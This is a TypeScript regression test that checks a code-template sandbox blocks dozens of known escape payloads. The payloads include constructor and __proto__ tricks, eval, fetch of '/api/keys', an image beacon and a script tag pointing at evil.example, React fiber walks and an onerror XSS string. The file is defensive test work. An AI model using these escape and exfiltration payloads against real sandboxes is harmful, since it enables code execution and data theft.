// Security regression suite for code-backed templates (src/template-host.ts,
// src/template-guard.ts). Every payload here is a real escape from the old
// regex-only sandbox: each must now be rejected before evaluation or neutralized
// at render time, while every bundled template keeps compiling.
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import * as React from 'react';
import { prepareTemplate, validateTemplate } from './template-host';
import { guardTemplateKey, isDeniedTemplateKey } from './template-guard';

const wrap = (body: string) => `const T = ({ item }) => { ${body}; return <div />; };`;

// Canary the escapes would reach. Any successful escape flips it.
(globalThis as Record<string, unknown>).openChatCutDesktop = {
  revealExport: () => { throw new Error('ESCAPED: desktop bridge reached'); },
};

const escapes: Record<string, string> = {
  'bare desktop bridge global': wrap('openChatCutDesktop.revealExport()'),
  'computed constructor on a function': wrap(`useCurrentFrame['constr' + 'uctor']('return this')()`),
  'template-literal constructor': wrap('useCurrentFrame[`constructor`]("return this")()'),
  'constructor via destructuring': wrap('const { constructor: F } = useCurrentFrame; F("return this")()'),
  'computed destructuring key': wrap(`const k = 'constr' + 'uctor'; const { [k]: F } = useCurrentFrame; F('x')`),
  'optional computed access': wrap(`const F = useCurrentFrame?.['constr' + 'uctor']; F('x')`),
  'async function constructor': wrap(`const F = (async () => {})['constr'+'uctor']; F('x')`),
  '__proto__ walk': wrap(`const p = ({})['__pro' + 'to__']; p.x = 1`),
  'Reflect global': wrap(`Reflect.get(useCurrentFrame, 'constructor')('x')`),
  'Function global': wrap('Function("return this")()'),
  'globalThis': wrap('globalThis.fetch("/api/keys")'),
  'self alias': wrap('self.fetch("/api/keys")'),
  'fetch': wrap('fetch("/api/skills")'),
  'XMLHttpRequest': wrap('new XMLHttpRequest()'),
  'Image beacon': wrap('new Image().src = "https://evil.example/?" + 1'),
  'document via ref': wrap('const r = React.useRef(null); r.current.ownerDocument.defaultView.fetch("/")'),
  'computed ownerDocument': wrap(`const el = item.props.el; el['owner' + 'Document'].defaultView`),
  'event view': wrap('const h = (e) => e.view.fetch("/"); h({})'),
  'parent walk': wrap('const r = React.useRef(null); r.current.parentNode.parentNode'),
  'V8 stack hook': wrap('Error.prepareStackTrace = (e, s) => s'),
  'Object.getPrototypeOf': wrap('Object.getPrototypeOf(useCurrentFrame)'),
  'Object.defineProperty': wrap('Object.defineProperty({}, "x", {})'),
  'dynamic import': wrap('import("data:text/javascript,1")'),
  'eval': wrap('eval("1")'),
  'reserved guard name': wrap('__occTemplateKey = (k) => k'),
  'arbitrary tagged template': wrap('const f = (s) => s; f`x`'),
  'React internals': wrap('React.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE'),
  'window.top': wrap('window.top'),
  'setTimeout': wrap('setTimeout(() => {}, 1)'),
  'import.meta': wrap('import.meta.url'),
  // Independent review finding: a class component's instance carries its React
  // fiber (`_reactInternals`), from which the whole editor tree is reachable.
  'class component fiber walk': `const T = ({ item }) => React.createElement(class extends React.Component {
    render() { let n = this._reactInternals; while (n && n.return) n = n.return; return null; }
  });`,
  'computed fiber key': wrap(`const k = '_react' + 'Internals'; const f = item.props.el[k]`),
  'fiber field on a plain object': wrap('item.props.el.stateNode'),
  'memoizedState': wrap('item.props.el.memoizedState'),
};

// A payload counts as blocked when compilation rejects it, or when rendering
// the compiled component throws before the payload can run.
const fakeElement = { ownerDocument: { defaultView: globalThis } };
for (const [name, code] of Object.entries(escapes)) {
  let error: unknown = null;
  try {
    const component = await prepareTemplate(code) as (props: unknown) => unknown;
    component({ item: { props: { el: fakeElement }, width: 1, height: 1 } });
  } catch (caught) {
    error = caught;
  }
  assert.ok(error instanceof Error, `${name} must be rejected`);
  assert.doesNotMatch(error.message, /ESCAPED/, `${name}: payload executed`);
}

// Runtime key guard: string-building that survives static checks is refused.
assert.throws(() => guardTemplateKey('constructor'));
assert.throws(() => guardTemplateKey({ toString: () => '__proto__' }));
assert.throws(() => guardTemplateKey('ownerDocument'));
assert.equal(guardTemplateKey(3), 3);
assert.equal(guardTemplateKey('top'), 'top');
assert.ok(isDeniedTemplateKey('__anything'));

// A computed key built at runtime is blocked when the template actually renders.
const lazy = await prepareTemplate(
  `const Lazy = ({ item }) => { const k = item.props.k; const v = interpolate[k]; return <div>{String(v)}</div>; };`,
);
assert.throws(
  () => (lazy as (p: unknown) => unknown)({ item: { props: { k: 'constructor' }, width: 1, height: 1 } }),
  /not allowed/,
);
assert.doesNotThrow(
  () => (lazy as (p: unknown) => unknown)({ item: { props: { k: 'length' }, width: 1, height: 1 } }),
);

// Element filter: code-loading elements render as nothing; srcDoc is stripped.
const hostile = await prepareTemplate(`const H = ({ item }) => (
  <div>
    <script src="https://evil.example/x.js" />
    <iframe srcDoc="<script>parent.openChatCutDesktop.revealExport()</script>" />
    <object data="x" />
    <span srcDoc="x" formAction="javascript:1">ok</span>
    <div dangerouslySetInnerHTML={{ __html: '<img src=x onerror="openChatCutDesktop.revealExport()">' }} />
  </div>
);`);
const tree = (hostile as (p: unknown) => React.ReactElement)({ item: { props: {}, width: 1, height: 1 } });
const kids = React.Children.toArray((tree.props as { children: React.ReactNode }).children) as React.ReactElement[];
const types = kids.map((child) => child.type);
assert.deepEqual(types, ['span', 'div'], 'script/iframe/object must render as nothing');
const span = kids[0].props as Record<string, unknown>;
assert.equal(span.srcDoc, undefined);
assert.equal(span.formAction, undefined);
assert.equal((kids[1].props as Record<string, unknown>).dangerouslySetInnerHTML, undefined,
  'markup with event handlers must be dropped');

// Class components are not template API: React.Component is hidden and a
// class passed as an element type renders nothing (no instance, no fiber).
const classType = await prepareTemplate(`const C = ({ item }) => {
  function Plain() { return null; }
  return <div><Plain /></div>;
};`);
assert.ok(classType, 'plain function components still work');
const refs = await prepareTemplate(`const R = ({ item }) => {
  const canvasRef = React.useRef(null);
  const divRef = React.useRef(null);
  return <div><canvas ref={canvasRef} /><div ref={divRef} /></div>;
};`);
void refs;
{
  const { createElementSafeForTests } = await import('./template-host');
  class Hostile extends React.Component { render() { return null; } }
  assert.equal(createElementSafeForTests(Hostile as never, null), null, 'class components render nothing');
  assert.equal(createElementSafeForTests(React.memo(() => null) as never, null), null, 'exotic element objects render nothing');
  const canvas = createElementSafeForTests('canvas', { ref: () => undefined }) as unknown as React.ReactElement<Record<string, unknown>>;
  assert.ok(canvas.props.ref !== undefined || (canvas as unknown as { ref?: unknown }).ref !== undefined, '<canvas> keeps its ref for 2D drawing');
  const div = createElementSafeForTests('div', { ref: () => undefined }) as unknown as React.ReactElement<Record<string, unknown>>;
  assert.equal(div.props.ref, undefined, 'other host elements never receive a live DOM ref');
}

// The regex layer still catches the classic forms.
assert.throws(() => validateTemplate('const T = () => fetch("/x")'));

// Compatibility: every bundled template still compiles under the guard.
let compiled = 0;
for (const file of ['koubo-scenes-templates', 'social-shorts-templates', 'openchatcut-templates']) {
  const templates = JSON.parse(readFileSync(new URL(`../assets/templates/${file}.json`, import.meta.url), 'utf8')) as { id: string; code: string }[];
  for (const template of templates) {
    await prepareTemplate(template.code).catch((error: unknown) => {
      throw new Error(`bundled template ${file}/${template.id} no longer compiles: ${String(error)}`);
    });
    compiled += 1;
  }
}
assert.ok(compiled >= 200, `expected the bundled template catalog, compiled ${compiled}`);

console.log(`template sandbox security verify passed (${Object.keys(escapes).length} escapes blocked, ${compiled} templates compile)`);
